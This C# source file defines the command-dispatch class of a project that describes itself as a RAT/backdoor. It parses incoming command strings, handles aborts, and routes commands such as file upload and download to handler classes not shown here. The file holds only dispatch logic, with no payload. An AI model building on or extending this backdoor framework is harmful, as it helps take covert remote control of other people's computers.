using RAT.Interfaces;
using RAT.Models.Enums;
using System;

namespace RAT.Logic.RatCommands
{
    /// <summary>
    /// Our rat/backdoor commands handling logic.
    /// </summary>
    public class RatCommandLogic : IRatCommandLogic
    {
        private readonly ISocketStateLogic _stateLogic;
        private readonly IClientNotificationLogic _notificationLogic;
        private readonly IRatCommandInterpreter _ratCommandInterpreter;
        private readonly IRatCommandFactory _commandFactory;

        /// <summary>
        /// Our rat/backdoor commands handling logic.
        /// </summary>
        /// <param name="stateLogic">Logic for our client state.</param>
        /// <param name="notificationLogic">Logic client notification.</param>
        /// <param name="ratCommandInterpreter">String command interpretator.</param>
        /// <param name="ratCommandFactory">Factory for our command clases.</param>
        public RatCommandLogic(
            ISocketStateLogic stateLogic,
            IClientNotificationLogic notificationLogic,
            IRatCommandInterpreter ratCommandInterpreter,
            IRatCommandFactory ratCommandFactory)
        {
            _stateLogic = stateLogic;
            _notificationLogic = notificationLogic;
            _ratCommandInterpreter = ratCommandInterpreter;
            _commandFactory = ratCommandFactory;
        }

        /// <summary>
        /// Handles rat command that client wants to execute.
        /// </summary>
        /// <param name="command">Command to handle (such as file upload, download, etc).</param>
        public void HandleRatCommand(string command)
        {
            // If this is known rat command, then get it in formatted state and proceed with further read.
            (bool isKnownRatCommand, string ratCommandInStringFormat) = _ratCommandInterpreter.IsKnownRatCommand(command);
            if (!isKnownRatCommand)
            {
                _notificationLogic.NotifyClient($"\nCommand \"{command}\" is unknown RAT command\n");
                return;
            }

            RatAvailableCommands staticRatCommand = (RatAvailableCommands)Enum.Parse(typeof(RatAvailableCommands), ratCommandInStringFormat, ignoreCase: true);

            // If user chose to abort some command.
            if (staticRatCommand == RatAvailableCommands.Abort)
            {
                _stateLogic.State.CurrentRatCommand?.Abort();
                return;
            }

            // Get class responsible for current command by converted enum.
            IRatCommand ratCommand = _commandFactory.GetRatCommand(staticRatCommand);
            _stateLogic.State.CurrentRatCommand = ratCommand;
            ratCommand.Execute(command);
        }

        /// <summary>
        /// Wrapper for method located in interpreter, so it would be available on upper level.
        /// </summary>
        /// <param name="command">Potential rat command.</param>
        /// <returns>True if it is potential rat command, false otherwise.</returns>
        public bool IsRatCommand(string command)
        {
            return _ratCommandInterpreter.IsRatCommand(command);
        }
    }
}